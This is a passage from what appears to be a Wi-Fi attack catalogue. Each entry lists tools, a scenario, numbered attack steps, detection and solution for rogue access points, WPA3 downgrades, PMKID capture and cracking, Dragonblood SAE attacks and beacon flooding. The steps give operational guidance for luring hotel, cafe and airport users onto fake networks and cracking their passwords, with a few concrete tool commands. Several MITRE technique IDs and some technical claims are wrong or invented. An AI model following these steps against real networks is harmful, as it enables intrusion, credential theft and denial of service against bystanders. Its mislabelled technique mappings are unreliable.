- **Attack Steps**: Step 1: Set up fake AP at a hotel lobby.Step 2: Configure SSID to mimic hotel's real Wi-Fi.Step 3: Label network as WPA3 in SSID or pop-up message.Step 4: Guests connect; PMKID captured by hcxdumptool.Step 5: Convert and crack.Step 6: Use cracked password at other hotel branches (if reused).Step 7: Study guest response to fake SSIDs.
- **Detection**: Deploy EAP-TLS with cert pinning
- **Solution**: WPA3 + captive portal hardening
- **Tags**: Fake WPA3, Public Wi-Fi

## Capturing PMKID via Multi-BSSID Broadcast from Rogue AP

- **Attack Type**: Wi-Fi (802.11) - WPA3 Downgrade
- **Target**: Multi-client WPA2 devices
- **Vulnerability**: Clients trust known SSIDs and BSSIDs blindly
- **MITRE**: T1583.007 (Spoof Infrastructure)
- **Impact**: Multiple Wi-Fi credentials leaked
- **Tools**: hostapd, hcxdumptool, aircrack-ng, hashcat
- **Scenario**: Attacker sets up a fake AP with multiple BSSIDs targeting various clients, increasing chance of PMKID capture.
- **Attack Steps**: Step 1: Use hostapd multi-BSSID config to spoof multiple known SSIDs.Step 2: Assign different MACs to each (via virtual interface).Step 3: Wait for different clients to auto-connect.Step 4: Run hcxdumptool and collect multiple PMKIDs.Step 5: Convert and crack all collected hashes.Step 6: Document which SSIDs were most vulnerable.Step 7: Rotate fake SSIDs over time for testing.
- **Detection**: Detect SSID spoofing patterns
- **Solution**: Enable MAC randomization and SSID filtering
- **Tags**: Multi-BSSID, PMKID

## WPA3 to WPA2 Downgrade via Captive Portal Redirect

- **Attack Type**: Wi-Fi (802.11) - WPA3 Downgrade
- **Target**: Users on WPA3 public networks
- **Vulnerability**: Captive portal creates false sense of WPA3
- **MITRE**: T1557.001, T1204
- **Impact**: Full takeover of victim Wi-Fi account
- **Tools**: dnsmasq, hostapd, hcxdumptool, iptables
- **Scenario**: Attacker intercepts WPA3 connection and redirects victim to WPA2 version with captive portal to harvest credentials.
- **Attack Steps**: Step 1: Set up hostapd with WPA2 SSID identical to WPA3 target.Step 2: Configure dnsmasq and iptables to redirect DNS to fake captive portal.Step 3: Victim connects thinking it’s WPA3, redirected to login page.Step 4: While handshake happens, hcxdumptool captures PMKID.Step 5: Use social engineering in portal to confirm email/pass.Step 6: Crack captured PMKID.Step 7: Compare hash-cracked key with user-entered credentials.
- **Detection**: DNS redirection monitoring
- **Solution**: Use EAP-TLS, disable captive portal for WPA3
- **Tags**: Captive Portal Abuse, PMKID

## Simulated WPA3 Guest Wi-Fi Downgrade to Capture PMKID

- **Attack Type**: Wi-Fi (802.11) - PMKID Hash Capture
- **Target**: Public WPA3 Wi-Fi
- **Vulnerability**: Clients accept WPA2 versions of WPA3 SSIDs
- **MITRE**: T1557.001 (Wi-Fi Spoofing)
- **Impact**: Public network compromise and password exposure
- **Tools**: airmon-ng, hostapd, hcxdumptool, hcxpcapngtool, hashcat
- **Scenario**: A coffee shop offers WPA3-enabled guest Wi-Fi. An attacker clones the SSID as WPA2 and waits for customers to reconnect, capturing the PMKID hash in the process.
- **Attack Steps**: Step 1: Use airmon-ng start wlan0 to enable monitor mode.Step 2: Use hostapd to create a fake AP with the same SSID as the coffee shop’s Wi-Fi but configured as WPA2.Step 3: Run the fake AP on the same channel as the real AP for maximum interference.Step 4: Start hcxdumptool to capture the PMKID from connecting clients.Step 5: Let victims' devices auto-connect to your fake AP believing it's the legitimate one.Step 6: Once PMKID is captured, convert .pcapng to hash using hcxpcapngtool.Step 7: Use hashcat to brute-force the password from the PMKID hash.Step 8: Connect to the real guest Wi-Fi using the cracked key for further testing.
- **Detection**: Monitor for multiple APs with the same SSID
- **Solution**: Enforce WPA3-only connections and PMF (Protected Management Frames)
- **Tags**: WPA3 Downgrade, Coffee Shop, Fake SSID

## Mass PMKID Collection with Multi-Channel Rotating Capture

- **Attack Type**: Wi-Fi (802.11) - WPA3 Downgrade
- **Target**: Residential and Commercial Wi-Fi
- **Vulnerability**: WPA2 handshake leaks PMKID across multiple channels
- **MITRE**: T1040 (Network Sniffing)
- **Impact**: Capture of PMKIDs across dozens of networks
- **Tools**: hcxdumptool, airmon-ng, Bash script
- **Scenario**: Attacker sets up a rotating scanner that switches Wi-Fi channels automatically, collecting PMKIDs from many routers over time.
- **Attack Steps**: Step 1: Enable monitor mode using airmon-ng start wlan0.Step 2: Create a Bash script that rotates through Wi-Fi channels 1 to 13 every 5 seconds.Step 3: Launch hcxdumptool in each iteration of the script to passively listen and capture handshake packets with PMKID.Step 4: Store the captured .pcapng files in separate folders for later analysis.Step 5: After several hours, stop the script and convert all captures using hcxpcapngtool.Step 6: Crack PMKID hashes with hashcat using multiple password lists.Step 7: Document success rate per SSID and channel for analysis.
- **Detection**: Spectrum anomaly detection tools
- **Solution**: Implement MAC randomization and 802.11w
- **Tags**: PMKID Harvesting, Passive, Multi-channel

## Exploiting WPA3 Mesh Routers Allowing WPA2 Backhaul

- **Attack Type**: Wi-Fi (802.11) - WPA3 Downgrade
- **Target**: Mesh Wi-Fi Systems
- **Vulnerability**: Mixed-mode encryption creates downgrade risk
- **MITRE**: T1557.002
- **Impact**: Lateral entry into WPA3 networks via WPA2 nodes
- **Tools**: hcxdumptool, airodump-ng, hostapd, hashcat
- **Scenario**: In some mesh router systems, the main node runs WPA3 but communicates with child nodes via WPA2. This allows attackers to capture PMKIDs from child nodes.
- **Attack Steps**: Step 1: Use airodump-ng to identify mesh routers with multiple SSIDs (one WPA3, one WPA2).Step 2: Set up hcxdumptool to listen near a child node operating in WPA2.Step 3: Wait for child nodes to reconnect or force re-authentication.Step 4: Capture the handshake and PMKID.Step 5: Convert .pcapng to hash using hcxpcapngtool.Step 6: Crack using hashcat and a common wordlist.Step 7: Use the cracked key to access the mesh’s backhaul traffic.
- **Detection**: Scan mesh nodes for inconsistent encryption
- **Solution**: Use encrypted backhaul with mutual authentication
- **Tags**: Mesh, WPA2 Backhaul, PMKID

## PMKID Theft via Power Cycling Smart Devices

- **Attack Type**: Wi-Fi (802.11) - WPA3 Downgrade
- **Target**: Smart TVs, Lights, Plugs
- **Vulnerability**: Devices prefer strong signal over secure protocol
- **MITRE**: T1200 (Hardware-Based)
- **Impact**: Full home Wi-Fi breach via non-secure devices
- **Tools**: Physical access, hostapd, hcxdumptool
- **Scenario**: The attacker physically reboots smart lights or smart TVs, forcing them to connect to a rogue WPA2 AP where PMKID can be captured.
- **Attack Steps**: Step 1: Clone the target’s SSID as WPA2 using hostapd.Step 2: Place rogue AP near smart devices.Step 3: Power cycle the smart device (unplug/replug or use switch).Step 4: Device reconnects to Wi-Fi — if it prefers signal strength over protocol, it connects to rogue AP.Step 5: Run hcxdumptool to capture PMKID from reconnection.Step 6: Convert .pcapng to hash format.Step 7: Crack using hashcat.
- **Detection**: Monitor MACs and device re-auth attempts
- **Solution**: Force WPA3-only on router or segment smart devices
- **Tags**: Smart Home, PMKID, Rogue AP

## Rogue WPA3 SSID Deceptively Configured as WPA2 with QR Code Attack

- **Attack Type**: Wi-Fi (802.11) - WPA3 Downgrade
- **Target**: Public Mobile Devices
- **Vulnerability**: QR codes induce trust, bypassing protocol awareness
- **MITRE**: T1204.001 (Malicious QR Code)
- **Impact**: Credential leakage from mobile users
- **Tools**: hostapd, qrencode, hcxdumptool, smartphone
- **Scenario**: Attacker prints a fake Wi-Fi QR code in a public space. Devices scanning the code connect to a WPA2 AP impersonating a WPA3 one, leaking PMKID.
- **Attack Steps**: Step 1: Setup a rogue WPA2 AP using hostapd with SSID like "Free_WiFi_Secure_WPA3".Step 2: Generate a Wi-Fi QR code using qrencode that connects to this rogue SSID.Step 3: Post the printed QR code near charging stations, cafes, or libraries.Step 4: When a person scans it, their phone connects, thinking it's secure.Step 5: Capture the PMKID using hcxdumptool.Step 6: Convert and crack with hashcat.Step 7: Document number of connections and security behavior.
- **Detection**: Enforce device WPA version policies
- **Solution**: Avoid auto-connecting via QR unless verified
- **Tags**: QR Wi-Fi Attack, PMKID

## WPA3 SAE Side-Channel Timing Leak

- **Attack Type**: Dragonblood Attack
- **Target**: Wi-Fi Router (WPA3)
- **Vulnerability**: SAE (Simultaneous Authentication of Equals)
- **MITRE**: T1040 (Network Sniffing)
- **Impact**: WPA3 password cracking
- **Tools**: Python, sae-timing-leak.py from Dragonblood toolkit
- **Scenario**: Exploiting the way WPA3 handles the Dragonfly handshake by measuring timing differences during password checks.
- **Attack Steps**: Step 1: Set up a Kali Linux machine with a Wi-Fi adapter in monitor mode.Step 2: Use the Dragonblood toolkit to initiate fake authentication requests to the WPA3-enabled access point.Step 3: Measure the time taken to respond to each request using the script.Step 4: Analyze the timing results to guess which password bits are correct.Step 5: Iterate multiple attempts to reconstruct the full password based on timing variations.
- **Detection**: Anomaly in authentication response time
- **Solution**: Use constant-time password comparison functions
- **Tags**: dragonblood, WPA3, timing-leak

## Reflection Attack on WPA3 SAE

- **Attack Type**: Dragonblood Attack
- **Target**: WPA3-enabled Client
- **Vulnerability**: SAE Protocol Handling
- **MITRE**: T1557.002 (Man-in-the-Middle: Network Device)
- **Impact**: Authentication bypass possibility
- **Tools**: Wireshark, Python, Dragonblood toolkit
- **Scenario**: The attacker reflects authentication messages back to the target device to confuse it and gather handshake data.
- **Attack Steps**: Step 1: Set up an attacker laptop with monitor mode enabled.Step 2: Start capturing packets using Wireshark.Step 3: Use Dragonblood’s reflection-saespoof.py script to reflect SAE messages received from the victim.Step 4: Trick the target into accepting its own message and analyze the response.Step 5: Use the captured messages to aid in offline password guessing.
- **Detection**: Packet reflection anomalies
- **Solution**: Implement mutual authentication checks
- **Tags**: WPA3, spoofing, reflection, MITM

## Password Partitioning Attack

- **Attack Type**: Dragonblood Attack
- **Target**: WPA3 Network
- **Vulnerability**: SAE Key Derivation Logic
- **MITRE**: T1110.001 (Brute Force: Password Guessing)
- **Impact**: Simplified password cracking
- **Tools**: Dragonblood, hashcat
- **Scenario**: Exploit the non-uniformity in how passwords are processed during the SAE handshake to simplify brute-force attacks.
- **Attack Steps**: Step 1: Use a Wi-Fi card in monitor mode to capture SAE handshake packets.Step 2: Extract the captured handshake.Step 3: Use Dragonblood’s sae-partition.py to perform partial key derivation.Step 4: Combine this with hashcat to brute-force only feasible password partitions.Step 5: Log which passwords cause partial matches and narrow down the real key.
- **Detection**: Monitoring packet replays and frequency
- **Solution**: Enforce strong password complexity rules
- **Tags**: WPA3, brute-force, SAE

## Downgrade to WPA2 Attack

- **Attack Type**: Dragonblood Attack
- **Target**: WPA3 Client Device
- **Vulnerability**: Transition Mode Handling
- **MITRE**: T1562.001 (Impair Defenses: Disable or Modify Tools)
- **Impact**: Downgrade to insecure WPA2
- **Tools**: aireplay-ng, Wireshark
- **Scenario**: Force a client to fall back to WPA2 where attacks like KRACK are possible.
- **Attack Steps**: Step 1: Scan for WPA3 networks with airodump-ng.Step 2: Send deauthentication packets with aireplay-ng to force client reconnection.Step 3: Broadcast a spoofed WPA2-only beacon from a rogue AP.Step 4: Wait for the victim device to connect to the rogue WPA2 AP.Step 5: Capture the WPA2 handshake and attempt KRACK or similar attacks.
- **Detection**: Connection to unauthorized WPA2 networks
- **Solution**: Disable WPA2/WPA3 transition mode
- **Tags**: downgrade, WPA2, deauth, spoofing

## Denial-of-Service via Group Key Reinstallation

- **Attack Type**: Dragonblood Attack
- **Target**: WPA3 Devices (Router/Client)
- **Vulnerability**: Improper Key Installation Logic
- **MITRE**: T1499 (Endpoint Denial of Service)
- **Impact**: Prevents Wi-Fi access for clients
- **Tools**: scapy, Dragonblood’s groupkey-dos.py
- **Scenario**: Exploit improper key handling to force clients into a DoS state during handshake renegotiation.
- **Attack Steps**: Step 1: Use a packet crafting tool like Scapy to forge group key handshake packets.Step 2: Inject them into the air during a key renewal phase.Step 3: The victim accepts the key reinstallation, resulting in a reset state.Step 4: Repeat the attack in intervals to prevent re-authentication.Step 5: Observe that the device cannot maintain a stable connection.
- **Detection**: Monitoring excessive group key changes
- **Solution**: Apply vendor firmware patch
- **Tags**: WPA3, DoS, key-reset, scapy

## SAE Curve Selection Manipulation

- **Attack Type**: Dragonblood Attack
- **Target**: WPA3 Client
- **Vulnerability**: SAE Group Negotiation
- **MITRE**: T1557.003 (Manipulate Protocols)
- **Impact**: Reduced handshake security
- **Tools**: Wi-Fi Adapter (monitor mode), Dragonblood toolkit
- **Scenario**: The attacker tricks the client into using a weak elliptic curve during the SAE handshake, enabling easier password cracking.
- **Attack Steps**: Step 1: Configure attacker’s Wi-Fi adapter in monitor mode using airmon-ng.Step 2: Start hostapd-wpe or use Dragonblood's tools to simulate a fake WPA3 AP.Step 3: During the handshake, respond with a weak or invalid elliptic curve (e.g., group 19 instead of 21).Step 4: Trick the client into performing key exchange using this insecure curve.Step 5: Capture the handshake and perform brute-force attacks more easily due to the reduced key strength.
- **Detection**: Monitoring curve negotiation parameters
- **Solution**: Disable support for weak groups
- **Tags**: elliptic curve, SAE, WPA3

## SAE Key Derivation Side-Channel via Cache Timing

- **Attack Type**: Dragonblood Attack
- **Target**: WPA3-enabled Router
- **Vulnerability**: CPU Cache Timing
- **MITRE**: T1046 (Network Service Scanning) + T1040
- **Impact**: Leaks password via cache side-channel
- **Tools**: Custom timing script, Dragonblood forked repo
- **Scenario**: Exploits the way WPA3 uses CPU cache to derive keys, measuring access time to infer secrets.
- **Attack Steps**: Step 1: Use a side-channel timing script on a local machine or Raspberry Pi.Step 2: Capture WPA3 handshake exchanges with a Wi-Fi adapter in monitor mode.Step 3: Time CPU cache responses during partial key computations.Step 4: Compare response times for multiple attempts to infer bits of the password.Step 5: Reconstruct the key using inferred timing data and offline brute-force techniques.
- **Detection**: Analyze CPU timing via system profiler
- **Solution**: Patch for constant-time cryptography
- **Tags**: side-channel, cache, WPA3, timing

## Misuse of Transition Mode for Rogue AP

- **Attack Type**: Dragonblood Attack
- **Target**: WPA3-Capable Client
- **Vulnerability**: WPA2/WPA3 Transition Mode
- **MITRE**: T1557.001 (Spoofing)
- **Impact**: Force downgrade to WPA2, perform MITM
- **Tools**: Airbase-ng, Wireshark, dnsmasq
- **Scenario**: Abuses WPA2/WPA3 transition mode to spoof a trusted AP using WPA2-only, tricking victims into insecure connections.
- **Attack Steps**: Step 1: Use airmon-ng and airbase-ng to set up a rogue WPA2 AP using the same SSID as a WPA3 target.Step 2: Enable DHCP and fake DNS using dnsmasq.Step 3: Deauth real WPA3 AP using aireplay-ng.Step 4: Wait for victim to reconnect to your WPA2 AP thinking it is trusted.Step 5: Sniff traffic, redirect DNS, and perform man-in-the-middle attacks.
- **Detection**: Detect multiple APs with same SSID
- **Solution**: Disable transition mode on networks
- **Tags**: WPA3 downgrade, rogue AP, transition

## Invalid Element Injection in SAE Exchange

- **Attack Type**: Dragonblood Attack
- **Target**: WPA3 Router
- **Vulnerability**: SAE Message Validation
- **MITRE**: T1499 (Endpoint Denial of Service)
- **Impact**: Disrupts Wi-Fi access via invalid packets
- **Tools**: Scapy, Dragonblood patch
- **Scenario**: Injects malformed SAE elements in handshake to cause crashes or induce DoS.
- **Attack Steps**: Step 1: Use Scapy or custom Python script to construct malformed SAE packets.Step 2: Inject crafted packets at the time of SAE key exchange using monitor mode.Step 3: Observe client or AP behavior — often results in software crash or authentication failure.Step 4: Repeatedly send malformed packets to disrupt service.Step 5: Use logs to confirm denial-of-service due to malformed SAE elements.
- **Detection**: Check crash logs in router/AP firmware
- **Solution**: Implement strict packet validation
- **Tags**: SAE, malformed, crash, DoS

## Fast Reconnect Attack with Modified Keys

- **Attack Type**: Dragonblood Attack
- **Target**: WPA3 Client
- **Vulnerability**: SAE Fast Reconnect Logic
- **MITRE**: T1557.002
- **Impact**: Predictive reconnect can reveal secrets
- **Tools**: Wireshark, hostapd, Scapy
- **Scenario**: Exploits client behavior during fast reconnection by injecting partial key exchanges to force reconnection with known keys.
- **Attack Steps**: Step 1: Use airmon-ng to capture a valid WPA3 handshake.Step 2: Disconnect client using deauth packets.Step 3: Spoof an AP with same SSID and partial valid credentials.Step 4: Observe client reconnect attempts — if “Fast Transition” is enabled, it tries to reuse prior keys.Step 5: Inject known or predictable parts of handshake to compromise connection.
- **Detection**: Monitor fast reconnect patterns
- **Solution**: Disable 802.11r or use mutual auth
- **Tags**: fast-reconnect, 802.11r, spoof

## Predictable Password Pattern Exploitation

- **Attack Type**: Dragonblood Attack
- **Target**: WPA3 Network
- **Vulnerability**: Weak User Passwords
- **MITRE**: T1110.003 (Credential Stuffing)
- **Impact**: Cracks WPA3 using social patterns
- **Tools**: hashcat, wordlists, Dragonblood
- **Scenario**: Use human behavior (e.g., repeated SSIDs and similar passwords) to reduce cracking time on WPA3 networks.
- **Attack Steps**: Step 1: Capture WPA3 handshake using monitor mode adapter.Step 2: Extract handshake using Wireshark.Step 3: Build a custom wordlist using predictable password variations based on SSID (e.g., MyWiFi2024, MyWiFi2025).Step 4: Use hashcat with SAE cracking mode to test the wordlist.Step 5: Identify successful key derivation and log successful passwords.
- **Detection**: Monitor connection logs and failed attempts
- **Solution**: Enforce strong password policy
- **Tags**: human-factor, guessable, SAE

## Disassociation Attack Pre-SAE Completion

- **Attack Type**: Dragonblood Attack
- **Target**: WPA3-enabled Client
- **Vulnerability**: SAE Completion Vulnerability
- **MITRE**: T1499
- **Impact**: Prevents device from authenticating
- **Tools**: aireplay-ng, Scapy
- **Scenario**: Floods disassociation frames before SAE completes, stalling connections indefinitely.
- **Attack Steps**: Step 1: Identify a client connecting to WPA3 AP.Step 2: Use aireplay-ng --deauth to inject disassociation frames during SAE handshake (after M1 but before M2).Step 3: Prevent full handshake from completing.Step 4: Repeatedly inject during reconnection to create long-term DoS.Step 5: Log effect on client connection retries.
- **Detection**: Monitor large volumes of disassoc packets
- **Solution**: Patch driver to resist early disassoc
- **Tags**: DoS, WPA3, deauth flood

## Group Element Forgery in SAE Commit

- **Attack Type**: Dragonblood Attack
- **Target**: WPA3 Router/Client
- **Vulnerability**: Input Validation Failure
- **MITRE**: T1203
- **Impact**: DoS or info leak via invalid commit group
- **Tools**: Scapy, Python
- **Scenario**: Crafting invalid group elements in SAE Commit message to confuse or crash target.
- **Attack Steps**: Step 1: Create a Scapy script to forge SAE Commit messages.Step 2: Insert invalid elliptic curve group element.Step 3: Inject it toward an authenticating device.Step 4: Log response — it may crash, hang, or reset connection.Step 5: Loop message to confirm DoS potential or gather error clues.
- **Detection**: Monitor failed authentication attempts
- **Solution**: Enforce stricter validation on group input
- **Tags**: elliptic curve, group spoof

## SAE Scalar Leakage via Timing Differential

- **Attack Type**: Dragonblood Attack
- **Target**: WPA3 Router
- **Vulnerability**: SAE Scalar Timing
- **MITRE**: T1040 + T1110.001
- **Impact**: Partial leakage reduces brute-force time
- **Tools**: Dragonblood modified timing analyzer
- **Scenario**: Subtle time leaks reveal partial scalar values used in SAE, aiding in key guessing.
- **Attack Steps**: Step 1: Trigger multiple SAE handshakes with the same client/AP.Step 2: Record precise timing of responses to scalar operations using script.Step 3: Use differential timing analysis to extract scalar bits.Step 4: Reconstruct part of the shared secret using leaked scalar.Step 5: Combine with wordlist attack to recover full key.
- **Detection**: Detect abnormal time variance in response
- **Solution**: Use constant-time cryptographic operations
- **Tags**: WPA3, timing, scalar, leak

## Rogue AP as WPA3 Honeypot

- **Attack Type**: Dragonblood Attack
- **Target**: Wi-Fi Clients
- **Vulnerability**: Insecure fallback
- **MITRE**: T1557.001
- **Impact**: Captures credentials using false assurance
- **Tools**: airbase-ng, hostapd-wpe
- **Scenario**: Attacker sets up a malicious AP claiming WPA3 but silently uses WPA2 to collect credentials.
- **Attack Steps**: Step 1: Configure a rogue AP using hostapd-wpe to mimic a WPA3 SSID.Step 2: Advertise WPA3 capability, but allow fallback to WPA2 under the hood.Step 3: Victim connects assuming WPA3 security.Step 4: Capture handshake and credentials (MSCHAPv2) using logging.Step 5: Replay or crack credentials offline.
- **Detection**: Detect mismatched security claims vs behavior
- **Solution**: Enforce client-side WPA3 validation
- **Tags**: WPA3, rogue, downgrade, honeypot

## SAE Commit Flooding for Memory Exhaustion

- **Attack Type**: Dragonblood Attack
- **Target**: WPA3 Access Point
- **Vulnerability**: Resource exhaustion via uncompleted handshakes
- **MITRE**: T1499.001 (Network DoS)
- **Impact**: Crashes or freezes the access point
- **Tools**: Scapy, Python
- **Scenario**: An attacker repeatedly sends fake SAE commit messages to a WPA3 access point to fill up its memory and crash or stall the device.
- **Attack Steps**: Step 1: Configure a Linux machine with a wireless adapter in monitor mode using airmon-ng.Step 2: Write a Python script using Scapy to create fake SAE commit messages with random MAC addresses (to simulate thousands of clients).Step 3: Continuously send these messages to the WPA3 access point without completing the handshake.Step 4: Monitor the access point — it will begin allocating memory to handle each fake handshake.Step 5: Eventually the AP runs out of memory or enters a denial-of-service state where it stops accepting new clients.Step 6: Log memory usage and crash behavior from the AP console or syslog.
- **Detection**: Monitor for excessive incomplete handshakes
- **Solution**: Set rate-limiting for handshake attempts and enable flood protection
- **Tags**: flooding, DoS, WPA3, commit-flood

## SAE Group Downgrade with Client Confusion

- **Attack Type**: Dragonblood Attack
- **Target**: WPA3 Client Device
- **Vulnerability**: Lack of enforced group preference
- **MITRE**: T1557.003 (Manipulate Protocols)
- **Impact**: Enables use of easily crackable group
- **Tools**: hostapd, aircrack-ng suite
- **Scenario**: An attacker advertises a weaker cryptographic group during handshake and tricks the client into using it, despite the AP’s stronger preference.
- **Attack Steps**: Step 1: Set up a rogue access point using hostapd and configure it to advertise support for a weak elliptic curve group (e.g., group 19).Step 2: Use aireplay-ng to deauthenticate the victim from the real WPA3 AP.Step 3: When the victim reconnects, it connects to the rogue AP and performs the SAE handshake using the weaker group.Step 4: Capture the handshake using Wireshark or tcpdump.Step 5: Since the group is weaker, use Dragonblood’s brute-force tools to crack the password faster than usual.Step 6: Demonstrate how misconfiguration or lack of enforcement allows downgrade attacks.
- **Detection**: Look for weaker-than-expected groups during handshakes
- **Solution**: Enforce server-side rejection of weak groups and mutual group negotiation
- **Tags**: downgrade, WPA3, group-manipulation

## Encrypted Traffic Reuse via Handshake Resets

- **Attack Type**: Dragonblood Attack
- **Target**: WPA3 Client/Router
- **Vulnerability**: Poor key reuse protection
- **MITRE**: T1557.004 (Protocol Downgrade) + T1040
- **Impact**: Replay of encrypted packets may become possible
- **Tools**: Wireshark, Python
- **Scenario**: Repeatedly resetting the handshake causes reuse of encryption keys, enabling traffic correlation or replay attacks.
- **Attack Steps**: Step 1: Set up Wi-Fi adapter in monitor mode and use Wireshark to capture traffic.Step 2: Observe a client connecting to the WPA3 AP and track SAE handshake attempts.Step 3: Inject deauthentication packets immediately after the client completes handshake but before starting encrypted communication.Step 4: Repeat the process, causing the client to re-use encryption keys without full renegotiation.Step 5: Analyze repeated encrypted traffic for patterns or replay possibilities (such as same IVs or session IDs).Step 6: Demonstrate the ability to correlate repeated encrypted data streams.
- **Detection**: Monitor for repeated connections with reused session keys
- **Solution**: Patch firmware to enforce per-session key uniqueness
- **Tags**: WPA3, replay, handshake-reset

## Beacon Injection with Fake WPA3 Capabilities

- **Attack Type**: Dragonblood Attack
- **Target**: WPA3-Capable Clients
- **Vulnerability**: Beacon trust without validation
- **MITRE**: T1557.001 (Spoofing)
- **Impact**: Users unknowingly connect insecurely
- **Tools**: Scapy, aircrack-ng, dnsmasq
- **Scenario**: An attacker injects beacon frames advertising WPA3 support to lure clients, but actually uses insecure WPA2 or open network underneath.
- **Attack Steps**: Step 1: Use Scapy to craft a beacon frame for a fake access point, advertising WPA3-SAE security.Step 2: Broadcast this frame using your wireless adapter in injection mode.Step 3: Set up a rogue AP using airbase-ng that only supports WPA2, but has the same SSID as advertised.Step 4: Deauthenticate clients from the real WPA3 AP using aireplay-ng.Step 5: Victim connects to your AP, thinking it is WPA3.Step 6: Capture the handshake and redirect DNS using dnsmasq for further exploitation.Step 7: Show how beacon manipulation tricks devices into insecure associations.
- **Detection**: Check beacon capability vs actual encryption used
- **Solution**: Validate actual encryption method post-association
- **Tags**: WPA3, beacon spoof, rogue AP

## SAE Commit Message Delay Exploitation

- **Attack Type**: Dragonblood Attack
- **Target**: WPA3 Access Point
- **Vulnerability**: Delayed state exhaustion
- **MITRE**: T1499
- **Impact**: Slows or crashes router via state hold
- **Tools**: Dragonblood, tc (traffic control), Scapy
- **Scenario**: By introducing artificial delays between handshake packets, an attacker forces resource locks on the AP and reduces performance.
- **Attack Steps**: Step 1: Use a modified Dragonblood script to initiate SAE commit exchanges.Step 2: Introduce large delay intervals between packets using Linux’s tc command to simulate packet delay.Step 3: Send the commit message and hold back the confirm message for an extended period.Step 4: The access point will hold resources in memory waiting for confirmation.Step 5: Repeat this behavior from multiple spoofed MACs.Step 6: Log router behavior to demonstrate increased CPU or memory usage due to resource locks.
- **Detection**: Monitor open sessions with long gaps
- **Solution**: Set handshake timeout and rate limits
- **Tags**: WPA3, delay, handshake abuse

## Fake SSID Overload

- **Attack Type**: Beacon Frame Flooding
- **Target**: Wi-Fi Clients & APs
- **Vulnerability**: Lack of beacon frame verification
- **MITRE**: T1496 (Resource Hijacking)
- **Impact**: Service disruption, client confusion
- **Tools**: mdk3, aireplay-ng, airmon-ng, compatible Wi-Fi adapter
- **Scenario**: An attacker floods the airspace with thousands of fake SSIDs using crafted beacon frames, confusing clients and overwhelming the access point scanning processes.
- **Attack Steps**: Step 1: Use airmon-ng to enable monitor mode on a Wi-Fi adapter. Step 2: Run mdk3 wlan0 b -f ssid_list.txt -s 100 where ssid_list.txt contains hundreds of fake SSID names. Step 3: Clients scanning for Wi-Fi see hundreds of fake networks, causing confusion. Step 4: APs may struggle to process excess management traffic. Step 5: Client connections may drop or fail due to beacon frame saturation.
- **Detection**: Wireless IDS (e.g., Kismet), beacon flood signature matching
- **Solution**: Enable SSID filtering, use 802.11w (management frame protection)
- **Tags**: Wi-Fi, SSID Spoofing, RF Jamming

## SSID Impersonation Chaos

- **Attack Type**: Beacon Frame Flooding
- **Target**: Wi-Fi Clients
- **Vulnerability**: Trust in SSID names without authentication
- **MITRE**: T1557.002 (Rogue Wi-Fi Access Points)
- **Impact**: User disconnection or misconnection
- **Tools**: mdk4, Aircrack-ng Suite, Python scapy
- **Scenario**: Attackers replicate popular SSIDs (e.g., “Starbucks_WiFi”) with fake beacon frames, causing users to connect to rogue APs or become disconnected.
- **Attack Steps**: Step 1: Identify popular SSIDs in an area (e.g., via airodump-ng). Step 2: Clone these SSIDs using mdk4 with b mode to broadcast multiple fake networks. Step 3: Optionally spoof MAC addresses to appear like legitimate routers. Step 4: Start flooding with fake beacons every 100 ms. Step 5: Watch client devices auto-switch to fake SSIDs or fail to connect.
- **Detection**: Network scans for SSID duplicates, spectrum analysis
- **Solution**: Use WPA3, validate AP identity with certificates
- **Tags**: SSID Spoof, Deception, Wi-Fi Confusion

## Management Frame Exhaustion

- **Attack Type**: Beacon Frame Flooding
- **Target**: Wi-Fi Routers & Clients
- **Vulnerability**: No rate-limiting on management frames
- **MITRE**: T1499.001 (Endpoint Denial of Service)
- **Impact**: Resource exhaustion on hardware
- **Tools**: Scapy, Wireshark, custom Python script
- **Scenario**: The attacker sends millions of crafted beacon frames with varying BSSIDs and channels to flood the management frame queue of Wi-Fi devices.
- **Attack Steps**: Step 1: Use airmon-ng to enable monitor mode on adapter. Step 2: Launch a script (e.g., with scapy) to generate unique beacon frames every few milliseconds. Step 3: Each frame uses a random MAC address and SSID. Step 4: Loop continuously to fill beacon queues on target clients and APs. Step 5: Monitor CPU spikes and interface resets on affected devices.
- **Detection**: Network health monitoring, CPU load spikes
- **Solution**: Patch firmware, use APs with beacon flood detection
- **Tags**: DoS, Frame Flood, Exhaustion

## Beacon Storm with Dynamic SSIDs

- **Attack Type**: Beacon Frame Flooding
- **Target**: Mobile Clients & Laptops
- **Vulnerability**: Open nature of beacon frames
- **MITRE**: T1498 (Network Denial of Service)
- **Impact**: Confusion, instability, battery drain
- **Tools**: mdk3, custom bash script
- **Scenario**: Flood of beacons with random SSID names every second to create a constantly changing wireless environment, simulating instability.
- **Attack Steps**: Step 1: Use a script to generate a list of random SSID names. Step 2: Feed the list to mdk3 in beacon flooding mode. Step 3: Beacon frames are broadcast with SSIDs like “FreeWiFi123”, “Public_WiFi_AB”, etc., changing every second. Step 4: Scanning clients show fluctuating SSID lists, making it hard to connect. Step 5: Monitor client-side behavior (battery drain, Wi-Fi failures).
- **Detection**: Manual inspection, beacon pattern anomaly detection
- **Solution**: Disable auto-connect, use 5GHz where less interference
- **Tags**: SSID Storm, Beacon Jam, Fake APs

## Fake Open SSID Attraction

- **Attack Type**: Beacon Frame Flooding
- **Target**: Mobile Users
- **Vulnerability**: Trust in open Wi-Fi, lack of user verification
- **MITRE**: T1557.002 (Rogue Wi-Fi Access Points)
- **Impact**: Credential theft, traffic snooping
- **Tools**: Wifiphisher, mdk3, Wireshark
- **Scenario**: Creates fake open Wi-Fi networks to lure users into connecting, exposing them to MitM or phishing once they connect.
- **Attack Steps**: Step 1: Use mdk3 to broadcast fake SSIDs with names like “Free_Public_WiFi”. Step 2: Remove encryption flags from beacon frames to make them appear open. Step 3: Optionally use Wifiphisher to redirect users to phishing pages once they connect. Step 4: Wait for victims to auto-connect or manually connect. Step 5: Analyze traffic or perform further phishing exploitation.
- **Detection**: DNS analysis, rogue AP detection, user reports
- **Solution**: Educate users, disable auto-connect to open networks
- **Tags**: Fake Open WiFi, Lure, Phishing

## Airport Wi-Fi Disruption via Beacon Clones

- **Attack Type**: Beacon Frame Flooding
- **Target**: Public Wi-Fi Clients
- **Vulnerability**: SSID name spoofing and lack of identity validation
- **MITRE**: T1557.002 (Rogue Wi-Fi APs)
- **Impact**: User confusion, DoS to real Wi-Fi
- **Tools**: Kali Linux, airmon-ng, mdk3, Wireshark
- **Scenario**: An attacker at an airport replicates the official SSID using fake beacon frames, overwhelming travelers' devices with conflicting signals.
